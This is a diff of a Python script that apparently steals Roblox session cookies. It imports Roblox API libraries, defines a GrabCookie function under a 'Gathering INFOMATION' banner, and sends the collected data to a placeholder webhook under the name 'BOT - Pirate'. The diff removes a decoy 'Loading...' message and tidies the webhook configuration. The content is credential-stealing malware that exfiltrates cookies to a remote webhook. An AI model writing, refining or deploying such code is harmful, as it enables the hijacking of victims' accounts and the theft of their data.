@@ -9,11 +9,8 @@ import robloxpy
 import robloxapi
 import json
 
-dummy_Message = "Loading..." #change this to whatever you want
-print(dummy_Message)
-
-conf = {
-    "webhook" : WEBHOOOOOK
+config = {
+    'webhook': "WEBHOOOOOK",
 }
 ################### Gathering INFOMATION #################################
 def GrabCookie():
@@ -55,4 +52,4 @@ data = {
     'username' : "BOT - Pirate 💎"
 }
 
-requests.post(webhook,data=data)
+requests.post(config["webhook"],data=data)
